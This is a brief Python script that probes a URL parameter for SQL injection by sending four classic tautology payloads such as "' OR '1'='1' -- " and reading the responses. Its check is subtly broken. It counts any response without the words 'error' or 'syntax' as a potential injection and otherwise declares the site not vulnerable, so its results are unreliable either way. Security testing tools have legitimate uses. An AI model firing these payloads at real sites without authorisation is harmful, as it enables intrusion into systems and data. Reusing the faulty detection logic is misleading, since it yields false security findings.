import requests

def test_sql_injection(url, param):
    payloads = ["' OR '1'='1", "' OR '1'='1' -- ", "' OR '1'='1' ({", "' OR '1'='1') -- "]
    results = []
    
    for payload in payloads:
        r = requests.get(url, params={param: payload})
        if "error" not in r.text.lower() and "syntax" not in r.text.lower():
            results.append(f"Potential SQL Injection with payload: {payload}")
    
    if len(results)==0:
        return ["the current website is not vulunerable to sql injection"]
    else:
        return results